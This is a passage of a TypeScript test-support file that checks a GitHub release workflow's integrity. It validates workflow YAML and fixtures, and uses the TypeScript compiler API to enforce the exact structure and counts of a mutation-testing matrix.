    repositoryCount < 1 ||
    channelCount < 1 ||
    script.includes("${{") ||
    !script.endsWith("\n") ||
    script.endsWith("\n\n")
  ) {
    return "";
  }
  return script
    .slice(0, -1)
    .split("$MCPB_RELEASE_REPOSITORY")
    .join(`\${{ github.repository }}`)
    .split("$MCPB_RELEASE_CHANNEL")
    .join(`\${{ steps.dist_tag.outputs.tag }}`);
}

function releaseWorkflowFixture(workflow: string, script: string): string {
  const normalized = normalizedReleaseTransactionFixture(script);
  if (normalized.length === 0) {
    throw new Error("release transaction fixture requires one terminal LF and pinned repository/channel variables");
  }
  const fixture = normalized
    .split("\n")
    .map((line) => `          ${line}`)
    .join("\n");
  return `${workflow.trimEnd()}\n${RELEASE_TRANSACTION_FIXTURE_KEY}: |\n${fixture}\n`;
}

function releaseTransactionFixtureBody(document: YamlRecord | null): string {
  const value = document?.[RELEASE_TRANSACTION_FIXTURE_KEY];
  return typeof value === "string" && value.endsWith("\n") && !value.endsWith("\n\n") ? value.slice(0, -1) : "";
}

function releaseTransactionRuntimeSnapshot(fixture: string): string {
  return fixture
    .split(`\${{ github.repository }}`)
    .join("$MCPB_RELEASE_REPOSITORY")
    .split(`\${{ steps.dist_tag.outputs.tag }}`)
    .join("$MCPB_RELEASE_CHANNEL");
}

function githubWorkflowSchemaProblems(source: string): string[] {
  let document: YamlRecord | null;
  try {
    document = yamlRecord(load(source));
  } catch {
    return ["GitHub workflow must be valid YAML"];
  }
  if (document === null) return ["GitHub workflow must be one mapping"];
  const problems: string[] = [];
  const walkEnvMaps = (value: unknown, path: string): void => {
    if (Array.isArray(value)) {
      value.forEach((entry, index) => {
        walkEnvMaps(entry, `${path}[${index}]`);
      });
      return;
    }
    const record = yamlRecord(value);
    if (record === null) return;
    for (const [key, entry] of Object.entries(record)) {
      if (key === "env") {
        const env = yamlRecord(entry);
        if (env !== null) {
          const seen = new Map<string, string>();
          for (const envKey of Object.keys(env)) {
            const folded = envKey.toLowerCase();
            const previous = seen.get(folded);
            if (previous !== undefined && previous !== envKey) {
              problems.push(`GitHub env map ${path}.env has case-insensitive duplicate ${previous}/${envKey}`);
            }
            seen.set(folded, envKey);
          }
        }
      }
      walkEnvMaps(entry, `${path}.${key}`);
    }
  };
  walkEnvMaps(document, "workflow");
  const jobs = yamlRecord(document.jobs) ?? {};
  for (const [jobName, jobValue] of Object.entries(jobs)) {
    for (const [stepIndex, step] of yamlSteps(yamlRecord(jobValue) ?? {}).entries()) {
      const body = runBody(step);
      if (body.length > GITHUB_RUN_CHARACTER_LIMIT) {
        problems.push(
          `GitHub run command jobs.${jobName}.steps[${stepIndex}] has ${body.length} characters; maximum is ${GITHUB_RUN_CHARACTER_LIMIT}`
        );
      }
    }
  }
  return problems;
}

function hasRunLine(step: YamlRecord | undefined, command: string): boolean {
  return runBody(step)
    .split("\n")
    .some((line) => line.trim() === command);
}

type MutationReplacer = (match: string, offset: number, source: string) => string;

/** Count non-overlapping mutation targets using the same semantics as string replacement. */
function mutationMatchCount(source: string, needle: string): number {
  if (needle.length === 0) throw new Error("mutation needle must not be empty");
  let count = 0;
  let offset = 0;
  while (true) {
    const match = source.indexOf(needle, offset);
    if (match === -1) return count;
    count++;
    offset = match + needle.length;
  }
}

/** Extract one exact set of positive integer captures for a structural timing contract. */
function exactPositiveIntegerCaptures(source: string, pattern: RegExp, expectedCaptures: number): number[] | null {
  if (!pattern.global || !Number.isSafeInteger(expectedCaptures) || expectedCaptures < 1) return null;
  const matches = [...source.matchAll(pattern)];
  if (matches.length !== 1) return null;
  const captures = matches[0]?.slice(1) ?? [];
  if (captures.length !== expectedCaptures) return null;
  const values = captures.map(Number);
  return values.every((value) => Number.isSafeInteger(value) && value > 0) ? values : null;
}

/** Require an exact live source shape before applying a structural-test mutation. */
function assertMutationPreconditions(source: string, needle: string, expectedOccurrences: number): void {
  if (!Number.isSafeInteger(expectedOccurrences) || expectedOccurrences < 1) {
    throw new Error("mutation expectedOccurrences must be a positive safe integer");
  }
  const actualOccurrences = mutationMatchCount(source, needle);
  if (actualOccurrences !== expectedOccurrences) {
    throw new Error(
      `mutation needle ${String(needle)} expected ${expectedOccurrences} occurrence(s), found ${actualOccurrences}`
    );
  }
}

/** Expand the four substitution tokens supported when String.replace receives a string search value. */
function expandLiteralReplacement(source: string, needle: string, replacement: string, offset: number): string {
  let expanded = "";
  for (let index = 0; index < replacement.length; index++) {
    const current = replacement.charAt(index);
    if (current !== "$") {
      expanded += current;
      continue;
    }
    const next = replacement.charAt(index + 1);
    if (next === "$") expanded += "$";
    else if (next === "&") expanded += needle;
    else if (next === "`") expanded += source.slice(0, offset);
    else if (next === "'") expanded += source.slice(offset + needle.length);
    else {
      expanded += "$";
      continue;
    }
    index++;
  }
  return expanded;
}

/** Replace the first literal target after an exact census. */
function replaceExactly(
  source: string,
  needle: string,
  replacement: string | MutationReplacer,
  expectedOccurrences = 1
): string {
  assertMutationPreconditions(source, needle, expectedOccurrences);
  const offset = source.indexOf(needle);
  const literalReplacement =
    typeof replacement === "string"
      ? expandLiteralReplacement(source, needle, replacement, offset)
      : String(replacement(needle, offset, source));
  const mutated = source.slice(0, offset) + literalReplacement + source.slice(offset + needle.length);
  if (mutated === source) throw new Error(`mutation needle ${String(needle)} did not change its source`);
  return mutated;
}

/** Replace every target only after proving its exact current source count. */
function replaceAllExactly(
  source: string,
  needle: string,
  replacement: string | MutationReplacer,
  expectedOccurrences = 1
): string {
  assertMutationPreconditions(source, needle, expectedOccurrences);
  const fragments: string[] = [];
  let cursor = 0;
  while (true) {
    const offset = source.indexOf(needle, cursor);
    if (offset === -1) break;
    fragments.push(source.slice(cursor, offset));
    fragments.push(
      typeof replacement === "string"
        ? expandLiteralReplacement(source, needle, replacement, offset)
        : String(replacement(needle, offset, source))
    );
    cursor = offset + needle.length;
  }
  fragments.push(source.slice(cursor));
  const mutated = fragments.join("");
  if (mutated === source) throw new Error(`mutation needle ${String(needle)} did not change its source`);
  return mutated;
}

/**
 * Keep every raw String.replace value access out of this release oracle.
 * Literal mutations use the exact census helpers above instead.
 */
function rawMutationCallProblems(source: string): string[] {
  const sourceFile = ts.createSourceFile(
    "release-integrity.test.ts",
    source,
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.TS
  );
  const problems: string[] = [];

  function staticPropertyText(node: ts.Node | undefined): string | null {
    let current = node;
    while (current) {
      if (ts.isComputedPropertyName(current)) current = current.expression;
      else if (
        ts.isParenthesizedExpression(current) ||
        ts.isAsExpression(current) ||
        ts.isTypeAssertionExpression(current) ||
        ts.isNonNullExpression(current) ||
        ts.isSatisfiesExpression(current)
      ) {
        current = current.expression;
      } else break;
    }
    return current &&
      (ts.isIdentifier(current) || ts.isStringLiteral(current) || ts.isNoSubstitutionTemplateLiteral(current))
      ? current.text
      : null;
  }

  function isTypeOnlyAccess(node: ts.Node): boolean {
    let current: ts.Node | undefined = node.parent;
    while (current) {
      if (ts.isTypeQueryNode(current)) return true;
      current = current.parent;
    }
    return false;
  }

  function visit(node: ts.Node): void {
    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      const propertyMethod = ts.isPropertyAccessExpression(node) ? staticPropertyText(node.name) : null;
      const elementArgument = ts.isElementAccessExpression(node) ? node.argumentExpression : undefined;
      const elementMethod = staticPropertyText(elementArgument);
      const method = propertyMethod ?? elementMethod;
      if ((method === "replace" || method === "replaceAll") && !isTypeOnlyAccess(node)) {
        const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
        problems.push(`raw .${method}() mutation at ${position.line + 1}:${position.character + 1}`);
      }
    }
    if (ts.isBindingElement(node) && ts.isObjectBindingPattern(node.parent)) {
      const boundProperty = staticPropertyText(node.propertyName ?? node.name);
      if (boundProperty === "replace" || boundProperty === "replaceAll") {
        const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
        problems.push(`raw .${boundProperty}() mutation at ${position.line + 1}:${position.character + 1}`);
      }
    }
    ts.forEachChild(node, visit);
  }

  visit(sourceFile);
  return problems;
}

const RELEASE_MUTATION_MATRIX_TEST_TITLE =
  "keeps release.yml wired to the shared evaluator and an exact mirrored inventory";
const RELEASE_MUTATION_MATRIX_SUITE_TITLE = "release identity and exact required-job gate";
const RELEASE_MUTATION_MATRIX_START = [
  "    const releaseWorkflow = readFileSync(",
  'new URL("../.github/workflows/release.yml", import.meta.url), "utf8");'
].join("");
const RELEASE_MUTATION_SELF_CONTROL_COUNT = 20;
const RELEASE_MUTATION_PROJECT_FIRST_COUNT = 538;
const RELEASE_MUTATION_PROJECT_ALL_COUNT = 22;
const RELEASE_MUTATION_PROJECT_TOTAL_COUNT = RELEASE_MUTATION_PROJECT_FIRST_COUNT + RELEASE_MUTATION_PROJECT_ALL_COUNT;
const RELEASE_MUTATION_PROJECT_ROOT_COUNT = 536;
const RELEASE_MUTATION_PROJECT_EXPECTATION_COUNT = 541;
const RELEASE_MUTATION_PROJECT_DEPENDENCY_ONLY_COUNT = 24;

/**
 * Pin the executable hybrid inventory that the declarative 5f.5a migration must consume exactly once.
 *
 * @param source - Complete release-integrity test source.
 * @returns Stable inventory diagnostics; empty only for 20 helper controls plus 560 explicit legacy or
 * declarative project mutations.
 */
function releaseMutationInventoryProblems(source: string): string[] {
  const sourceFile = ts.createSourceFile(
    "release-integrity.test.ts",
    source,
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.TS
  );
  const problems: string[] = [];
  let directVitestDescribeImports = 0;
  let directVitestItImports = 0;
  let otherDescribeBindings = 0;
  let otherItBindings = 0;
  let directReleaseMutationPlanImports = 0;
  let otherReleaseMutationPlanBindings = 0;
  const recordOtherBinding = (name: ts.BindingName | ts.Identifier): void => {
    if (ts.isIdentifier(name)) {
      if (name.text === "describe") otherDescribeBindings++;
      if (name.text === "it") otherItBindings++;
      if (name.text === "ReleaseMutationPlan") otherReleaseMutationPlanBindings++;
      return;
    }
    for (const element of name.elements) {
      if (ts.isBindingElement(element)) recordOtherBinding(element.name);
    }
  };
  for (const statement of sourceFile.statements) {
    if (!ts.isImportDeclaration(statement)) continue;
    const importClause = statement.importClause;
    if (importClause === undefined || importClause.isTypeOnly) continue;
    if (importClause.name !== undefined) recordOtherBinding(importClause.name);
    const namedBindings = importClause.namedBindings;
    if (namedBindings === undefined) continue;
    if (ts.isNamespaceImport(namedBindings)) {
      recordOtherBinding(namedBindings.name);
      continue;
    }
    const moduleName = ts.isStringLiteral(statement.moduleSpecifier) ? statement.moduleSpecifier.text : null;
    for (const element of namedBindings.elements) {
      if (element.isTypeOnly) continue;
      const isDirectVitestBinding = moduleName === "vitest" && element.propertyName === undefined;
      if (element.name.text === "describe") {
        if (isDirectVitestBinding) directVitestDescribeImports++;
        else otherDescribeBindings++;
      }
      if (element.name.text === "it") {
        if (isDirectVitestBinding) directVitestItImports++;
        else otherItBindings++;
      }
      if (element.name.text === "ReleaseMutationPlan") {
        if (moduleName === "./release-mutation-plan.js" && element.propertyName === undefined) {
          directReleaseMutationPlanImports++;
        } else otherReleaseMutationPlanBindings++;
      }
    }
  }
  const visitRuntimeBindings = (node: ts.Node): void => {
    if (ts.isImportDeclaration(node)) return;
    if (ts.isVariableDeclaration(node) || ts.isParameter(node)) {
      recordOtherBinding(node.name);
    } else if (
      ts.isFunctionDeclaration(node) ||
      ts.isFunctionExpression(node) ||
      ts.isClassDeclaration(node) ||
      ts.isClassExpression(node) ||
      ts.isEnumDeclaration(node) ||
      ts.isModuleDeclaration(node) ||
      ts.isImportEqualsDeclaration(node)
    ) {
      if (node.name !== undefined && ts.isIdentifier(node.name)) recordOtherBinding(node.name);
    }
    ts.forEachChild(node, visitRuntimeBindings);
  };
  visitRuntimeBindings(sourceFile);
  if (
    directVitestDescribeImports !== 1 ||
    directVitestItImports !== 1 ||
    otherDescribeBindings !== 0 ||
    otherItBindings !== 0
  ) {
    problems.push(
      `release mutation matrix must bind describe/it to one exact unaliased vitest import with no runtime shadows; found direct ${directVitestDescribeImports}/${directVitestItImports}, other ${otherDescribeBindings}/${otherItBindings}`
    );
  }
  if (directReleaseMutationPlanImports !== 1 || otherReleaseMutationPlanBindings !== 0) {
    problems.push(
      `release mutation matrix must bind ReleaseMutationPlan to one exact unaliased test-support import with no runtime shadows; found direct ${directReleaseMutationPlanImports}, other ${otherReleaseMutationPlanBindings}`
    );
  }
  const matrixStartCount = mutationMatchCount(source, RELEASE_MUTATION_MATRIX_START);
  if (matrixStartCount !== 1) {
    return [`release mutation matrix start expected 1 occurrence, found ${matrixStartCount}`];
  }
  const matrixStart = source.indexOf(RELEASE_MUTATION_MATRIX_START);
  let callbackStart = -1;
  let callbackEnd = -1;
  let matrixCallback: ts.ArrowFunction | null = null;
  let matrixSuiteCallback: ts.ArrowFunction | null = null;
  let matrixRegistrationStart = -1;

  const locateMatrixCallback = (node: ts.Node): void => {
    const title = ts.isCallExpression(node) ? node.arguments[0] : undefined;
    if (
      ts.isCallExpression(node) &&
      ts.isIdentifier(node.expression) &&
      node.expression.text === "it" &&
      title !== undefined &&
      ts.isStringLiteral(title) &&
      title.text === RELEASE_MUTATION_MATRIX_TEST_TITLE
    ) {
      const callback = node.arguments[1];
      if (callback !== undefined && ts.isArrowFunction(callback) && ts.isBlock(callback.body)) {
        if (callbackStart !== -1) {
          problems.push("release mutation matrix test must have one exact callback");
        } else {
          callbackStart = callback.body.getStart(sourceFile);
          callbackEnd = callback.body.end;
          matrixCallback = callback;
          matrixRegistrationStart = node.getStart(sourceFile);

          const testStatement = ts.isExpressionStatement(node.parent) ? node.parent : null;
          const suiteBlock = testStatement !== null && ts.isBlock(testStatement.parent) ? testStatement.parent : null;
          const suiteCallback =
            suiteBlock !== null && ts.isArrowFunction(suiteBlock.parent) && suiteBlock.parent.body === suiteBlock
              ? suiteBlock.parent
              : null;
          const suiteCall =
            suiteCallback !== null &&
            ts.isCallExpression(suiteCallback.parent) &&
            suiteCallback.parent.arguments[1] === suiteCallback
              ? suiteCallback.parent
              : null;
          const suiteTitle = suiteCall?.arguments[0];
          const suiteStatement =
            suiteCall !== null && ts.isExpressionStatement(suiteCall.parent) ? suiteCall.parent : null;
          const timeout = node.arguments[2];
          const isDirectRegistration =
            callback.parameters.length === 0 &&
            callback.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword) !== true &&
            node.arguments.length === 3 &&
            timeout !== undefined &&
            timeout.getText(sourceFile) === "60_000" &&
            node.questionDotToken === undefined &&
            testStatement !== null &&
            suiteBlock !== null &&
            suiteCallback !== null &&
            suiteCallback.parameters.length === 0 &&
            suiteCallback.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword) !== true &&
            suiteCall !== null &&
            suiteCall.arguments.length === 2 &&
            suiteCall.questionDotToken === undefined &&
            ts.isIdentifier(suiteCall.expression) &&
            suiteCall.expression.text === "describe" &&
            suiteTitle !== undefined &&
            ts.isStringLiteral(suiteTitle) &&
            suiteTitle.text === RELEASE_MUTATION_MATRIX_SUITE_TITLE &&
            suiteStatement !== null &&
            suiteStatement.parent === sourceFile;
          if (isDirectRegistration && suiteCallback !== null) {
            matrixSuiteCallback = suiteCallback;
          } else {
            problems.push(
              "release mutation matrix must be one direct unskipped top-level describe/it registration with zero-argument block callbacks and the exact 60_000ms timeout"
            );
          }
        }
      } else {
        problems.push("release mutation matrix test must use one zero-argument block arrow callback");
      }
    }
    ts.forEachChild(node, locateMatrixCallback);
  };
  locateMatrixCallback(sourceFile);
  if (callbackStart === -1 || callbackEnd === -1 || matrixStart <= callbackStart || matrixStart >= callbackEnd) {
    problems.push("release mutation matrix start must sit inside its exact test callback");
    return problems;
  }

  let selfFirst = 0;
  let selfAll = 0;
  let projectFirst = 0;
  let projectAll = 0;
  let declarativeFirst = 0;
  let declarativeAll = 0;
  let declarativeSources = 0;
  let declarativeCases = 0;
  let declarativePlanBindings = 0;
  const declarativePlanInventories: Array<{
    readonly total: number | null;
    readonly first: number | null;
    readonly all: number | null;
    readonly structurallyValid: boolean;
  }> = [];
  let outside = 0;
  let firstDefinitions = 0;
  let allDefinitions = 0;
  const nonStraightLineProjectCalls: string[] = [];
  const declarativeMutationIds = new Set<string>();
  const declarativeCaseIds = new Set<string>();
  const declarativeCaseRoots = new Set<string>();
  const declarativeExpectationIds = new Set<string>();
  const declarativeSourceHandles = new Set<string>();
  const declarativeMutationHandles = new Set<string>();
  const declarativeCaseDescriptors: ts.ObjectLiteralExpression[] = [];
  const declarativeSealCalls: ts.CallExpression[] = [];
  const declarativeExecuteCalls: ts.CallExpression[] = [];
  let lastDeclarativeRegistrationEnd = -1;
  const nonStraightLineAncestor = (node: ts.Node): ts.Node | null => {
    const isWithin = (container: ts.Node): boolean =>
      node.getStart(sourceFile) >= container.getStart(sourceFile) && node.end <= container.end;
    let current: ts.Node | undefined = node.parent;
    while (current && !(current.getStart(sourceFile) === callbackStart && current.end === callbackEnd)) {
      const isOptionalChain = "questionDotToken" in current && current.questionDotToken !== undefined;
      if (
        (ts.isForStatement(current) && (current.initializer === undefined || !isWithin(current.initializer))) ||
        (ts.isForInStatement(current) && !isWithin(current.expression)) ||
        (ts.isForOfStatement(current) && !isWithin(current.expression)) ||
        ts.isWhileStatement(current) ||
        ts.isDoStatement(current) ||
        ts.isIfStatement(current) ||
        ts.isConditionalExpression(current) ||
        ts.isSwitchStatement(current) ||
        ts.isTryStatement(current) ||
        ts.isLabeledStatement(current) ||
        ts.isWithStatement(current) ||
        ts.isFunctionLike(current) ||
        ts.isClassDeclaration(current) ||
        ts.isClassExpression(current) ||
        (ts.isBindingElement(current) && current.initializer !== undefined && isWithin(current.initializer)) ||
        isOptionalChain ||
        (ts.isBinaryExpression(current) &&
          (current.operatorToken.kind === ts.SyntaxKind.AmpersandAmpersandToken ||
            current.operatorToken.kind === ts.SyntaxKind.BarBarToken ||
            current.operatorToken.kind === ts.SyntaxKind.QuestionQuestionToken ||
            current.operatorToken.kind === ts.SyntaxKind.AmpersandAmpersandEqualsToken ||
            current.operatorToken.kind === ts.SyntaxKind.BarBarEqualsToken ||
            current.operatorToken.kind === ts.SyntaxKind.QuestionQuestionEqualsToken))
      ) {
        return current;
      }
      current = current.parent;
    }
    return null;
  };
  const topLevelConstHandle = (call: ts.CallExpression): string | null => {
    const declaration = ts.isVariableDeclaration(call.parent) && call.parent.initializer === call ? call.parent : null;
    const declarationList =
      declaration !== null && ts.isVariableDeclarationList(declaration.parent) ? declaration.parent : null;
    const statement =
      declarationList !== null && ts.isVariableStatement(declarationList.parent) ? declarationList.parent : null;
    return declaration !== null &&
      ts.isIdentifier(declaration.name) &&
      declarationList !== null &&
      (declarationList.flags & ts.NodeFlags.Const) !== 0 &&
      statement !== null &&
      matrixCallback !== null &&
      statement.parent === matrixCallback.body
      ? declaration.name.text
      : null;
  };
  const visitCalls = (node: ts.Node): void => {
    if (ts.isReturnStatement(node)) {
      let owner: ts.Node | undefined = node.parent;
      while (owner && !ts.isFunctionLike(owner)) owner = owner.parent;
      const start = node.getStart(sourceFile);
      if (owner === matrixCallback && start > callbackStart && node.end <= callbackEnd) {
        const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
        problems.push(
          `release mutation matrix callback must not return before all explicit cases execute at ${position.line + 1}:${position.character + 1}`
        );
      } else if (owner === matrixSuiteCallback && start < matrixRegistrationStart) {
        const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
        problems.push(
          `release mutation suite callback must not return before matrix registration at ${position.line + 1}:${position.character + 1}`
        );
      }
    }
    if (ts.isIdentifier(node) && (node.text === "replaceExactly" || node.text === "replaceAllExactly")) {
      const parent = node.parent;
      const isReviewedDefinition =
        ts.isFunctionDeclaration(parent) && parent.name === node && parent.parent === sourceFile;
      const isDirectCall = ts.isCallExpression(parent) && parent.expression === node;
      if (isReviewedDefinition) {
        if (node.text === "replaceAllExactly") allDefinitions++;
        else firstDefinitions++;
      }
      if (!isReviewedDefinition && !isDirectCall) {
        const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
        problems.push(
          `release mutation helper ${node.text} must be a direct call to its sole top-level definition at ${position.line + 1}:${position.character + 1}`
        );
      }
    }
    if (
      ts.isCallExpression(node) &&
      ts.isIdentifier(node.expression) &&
      (node.expression.text === "replaceExactly" || node.expression.text === "replaceAllExactly")
    ) {
      const start = node.getStart(sourceFile);
      const isAll = node.expression.text === "replaceAllExactly";
      if (start > callbackStart && start < matrixStart) {
        if (isAll) selfAll++;
        else selfFirst++;
      } else if (start >= matrixStart && start < callbackEnd) {
        if (isAll) projectAll++;
        else projectFirst++;
        const nonStraightLine = nonStraightLineAncestor(node);
        if (nonStraightLine !== null) {
          const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
          nonStraightLineProjectCalls.push(
            `release mutation project helper ${node.expression.text} must be one explicit straight-line case, not nested under ${ts.SyntaxKind[nonStraightLine.kind]} at ${position.line + 1}:${position.character + 1}`
          );
        }
      } else {
        outside++;
      }
    }
    const start = node.getStart(sourceFile);
    const inProjectMatrix = start >= matrixStart && start < callbackEnd;
    if (
      inProjectMatrix &&
      ts.isVariableDeclaration(node) &&
      ts.isIdentifier(node.name) &&
      node.name.text === "releaseMutationPlan"
    ) {
      declarativePlanBindings++;
      const declarationList = ts.isVariableDeclarationList(node.parent) ? node.parent : null;
      const statement =
        declarationList !== null && ts.isVariableStatement(declarationList.parent) ? declarationList.parent : null;
      const initializer = node.initializer;
      const inventory =
        initializer !== undefined &&
        ts.isNewExpression(initializer) &&
        ts.isIdentifier(initializer.expression) &&
        initializer.expression.text === "ReleaseMutationPlan" &&
        initializer.arguments?.length === 1 &&
        initializer.arguments[0] !== undefined &&
        ts.isObjectLiteralExpression(initializer.arguments[0])
          ? initializer.arguments[0]
          : null;
      const inventoryValue = (name: string): number | null => {
        if (inventory === null) return null;
        const matches = inventory.properties.filter(
          (property): property is ts.PropertyAssignment =>
            ts.isPropertyAssignment(property) &&
            ((ts.isIdentifier(property.name) && property.name.text === name) ||
              (ts.isStringLiteral(property.name) && property.name.text === name))
        );
        const value = matches[0]?.initializer;
        if (matches.length !== 1 || value === undefined || !ts.isNumericLiteral(value)) return null;
        return Number(value.text);
      };
      const isConst = declarationList !== null && (declarationList.flags & ts.NodeFlags.Const) !== 0;
      const isTopLevel = statement !== null && matrixCallback !== null && statement.parent === matrixCallback.body;
      declarativePlanInventories.push({
        total: inventoryValue("total"),
        first: inventoryValue("first"),
        all: inventoryValue("all"),
        structurallyValid: isConst && isTopLevel && inventory !== null && inventory.properties.length === 3
      });
    }
    const declarativeMethod = (() => {
      if (ts.isPropertyAccessExpression(node) && ts.isIdentifier(node.name)) return node.name.text;
      if (
        ts.isElementAccessExpression(node) &&
        node.argumentExpression !== undefined &&
        (ts.isStringLiteral(node.argumentExpression) || ts.isNoSubstitutionTemplateLiteral(node.argumentExpression))
      ) {
        return node.argumentExpression.text;
      }
      return null;
    })();
    if (
      inProjectMatrix &&
      (declarativeMethod === "registerSource" ||
        declarativeMethod === "registerMutation" ||
        declarativeMethod === "registerCase" ||
        declarativeMethod === "seal" ||
        declarativeMethod === "execute") &&
      (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node))
    ) {
      const parent = node.parent;
      const directCall = ts.isCallExpression(parent) && parent.expression === node;
      const exactReceiver = ts.isIdentifier(node.expression) && node.expression.text === "releaseMutationPlan";
      const exactProperty = ts.isPropertyAccessExpression(node);
      if (!directCall || !exactReceiver || !exactProperty) {
        const position = sourceFile.getLineAndCharacterOfPosition(start);
        problems.push(
          `release mutation declarative ${declarativeMethod} must be one direct property call on releaseMutationPlan at ${position.line + 1}:${position.character + 1}`
        );
      } else {
        const nonStraightLine = nonStraightLineAncestor(parent);
        if (nonStraightLine !== null) {
          const position = sourceFile.getLineAndCharacterOfPosition(start);
          problems.push(
            `release mutation declarative ${declarativeMethod} must be one explicit straight-line registration, not nested under ${ts.SyntaxKind[nonStraightLine.kind]} at ${position.line + 1}:${position.character + 1}`
          );
        }
        if (declarativeMethod === "seal" || declarativeMethod === "execute") {
          if (parent.arguments.length !== 0) {
            const position = sourceFile.getLineAndCharacterOfPosition(start);
            problems.push(
              `release mutation declarative ${declarativeMethod} requires zero arguments at ${position.line + 1}:${position.character + 1}`
            );
          }
          if (declarativeMethod === "seal") declarativeSealCalls.push(parent);
          else declarativeExecuteCalls.push(parent);
        } else if (declarativeMethod === "registerSource") {
          declarativeSources++;
          lastDeclarativeRegistrationEnd = Math.max(lastDeclarativeRegistrationEnd, parent.end);
          const id = parent.arguments[0];
          const value = parent.arguments[1];
          const handle = topLevelConstHandle(parent);
          if (
            parent.arguments.length !== 2 ||
            id === undefined ||
            !ts.isStringLiteral(id) ||
            value === undefined ||
            (!ts.isIdentifier(value) && !ts.isStringLiteral(value)) ||
            handle === null
          ) {
            const position = sourceFile.getLineAndCharacterOfPosition(start);
            problems.push(
              `release mutation declarative registerSource requires one top-level const handle, literal id and passive identifier/string source value at ${position.line + 1}:${position.character + 1}`
            );
          } else {
            if (declarativeSourceHandles.has(handle) || declarativeMutationHandles.has(handle)) {
              problems.push(`release mutation declarative duplicate handle binding ${handle}`);
            }
            declarativeSourceHandles.add(handle);
          }
        } else if (declarativeMethod === "registerMutation") {
          lastDeclarativeRegistrationEnd = Math.max(lastDeclarativeRegistrationEnd, parent.end);
          const id = parent.arguments[0];
          const descriptor = parent.arguments[1];
          const handle = topLevelConstHandle(parent);
          if (parent.arguments.length !== 2 || id === undefined || !ts.isStringLiteral(id) || handle === null) {
            const position = sourceFile.getLineAndCharacterOfPosition(start);
            problems.push(
              `release mutation declarative registerMutation requires one top-level const handle, literal id and object descriptor at ${position.line + 1}:${position.character + 1}`
            );
          } else {
            if (declarativeMutationIds.has(id.text)) {
              problems.push(`release mutation declarative duplicate mutation id ${id.text}`);
            }
            declarativeMutationIds.add(id.text);
            if (declarativeSourceHandles.has(handle) || declarativeMutationHandles.has(handle)) {
              problems.push(`release mutation declarative duplicate handle binding ${handle}`);
            }
            declarativeMutationHandles.add(handle);
          }
          if (descriptor === undefined || !ts.isObjectLiteralExpression(descriptor)) {
            const position = sourceFile.getLineAndCharacterOfPosition(start);
            problems.push(
              `release mutation declarative registerMutation requires one literal id and one object descriptor at ${position.line + 1}:${position.character + 1}`
            );
          } else {
            const descriptorProperty = (name: string): ts.PropertyAssignment[] =>
              descriptor.properties.filter(
                (property): property is ts.PropertyAssignment =>
                  ts.isPropertyAssignment(property) &&
                  ((ts.isIdentifier(property.name) && property.name.text === name) ||
                    (ts.isStringLiteral(property.name) && property.name.text === name))
              );
            const descriptorPropertyNames = descriptor.properties.map((property) => {
              if (!ts.isPropertyAssignment(property)) return null;
              if (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name)) return property.name.text;
              return null;
            });
            const exactDescriptorFields = ["mode", "source", "needle", "replacement", "expectedOccurrences", "witness"];
            if (
              descriptorPropertyNames.some((name) => name === null) ||
              descriptorPropertyNames.length !== exactDescriptorFields.length ||
              new Set(descriptorPropertyNames).size !== descriptorPropertyNames.length ||
              !exactDescriptorFields.every((name) => descriptorPropertyNames.includes(name))
            ) {
              const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
              problems.push(
                `release mutation declarative descriptor requires exact passive mode/source/needle/replacement/expectedOccurrences/witness fields at ${position.line + 1}:${position.character + 1}`
              );
            }
            const modeProperties = descriptorProperty("mode");
            const mode = modeProperties[0]?.initializer;
            if (
              modeProperties.length !== 1 ||
              mode === undefined ||
              !ts.isStringLiteral(mode) ||
              (mode.text !== "first" && mode.text !== "all")
            ) {
              const position = sourceFile.getLineAndCharacterOfPosition(start);
              problems.push(
                `release mutation declarative registerMutation requires one literal first/all mode at ${position.line + 1}:${position.character + 1}`
              );
            } else if (mode.text === "all") declarativeAll++;
            else declarativeFirst++;
            const source = descriptorProperty("source")[0]?.initializer;
            if (
              descriptorProperty("source").length !== 1 ||
              source === undefined ||
              !ts.isIdentifier(source) ||
              (!declarativeSourceHandles.has(source.text) && !declarativeMutationHandles.has(source.text))
            ) {
              const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
              problems.push(
                `release mutation declarative descriptor source must be one explicit registered handle at ${position.line + 1}:${position.character + 1}`
              );
            }
            const passiveString = (value: ts.Expression | undefined): boolean =>
              value !== undefined && (ts.isStringLiteral(value) || ts.isIdentifier(value));
            const needle = descriptorProperty("needle")[0]?.initializer;
            if (descriptorProperty("needle").length !== 1 || !passiveString(needle)) {
              const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
              problems.push(
                `release mutation declarative descriptor needle must be one passive identifier/string value at ${position.line + 1}:${position.character + 1}`
              );
            }
            const replacement = descriptorProperty("replacement")[0]?.initializer;
            if (
              descriptorProperty("replacement").length !== 1 ||
              !passiveString(replacement) ||
              (replacement !== undefined &&
                ts.isIdentifier(replacement) &&
                declarativeSourceHandles.has(replacement.text))
            ) {
              const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
              problems.push(
                `release mutation declarative descriptor replacement must be one passive string value or mutation handle at ${position.line + 1}:${position.character + 1}`
              );
            }
            const expectedOccurrences = descriptorProperty("expectedOccurrences")[0]?.initializer;
            if (
              descriptorProperty("expectedOccurrences").length !== 1 ||
              expectedOccurrences === undefined ||
              !ts.isNumericLiteral(expectedOccurrences) ||
              !Number.isSafeInteger(Number(expectedOccurrences.text)) ||
              Number(expectedOccurrences.text) <= 0
            ) {
              const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
              problems.push(
                `release mutation declarative descriptor expectedOccurrences must be one positive safe integer literal at ${position.line + 1}:${position.character + 1}`
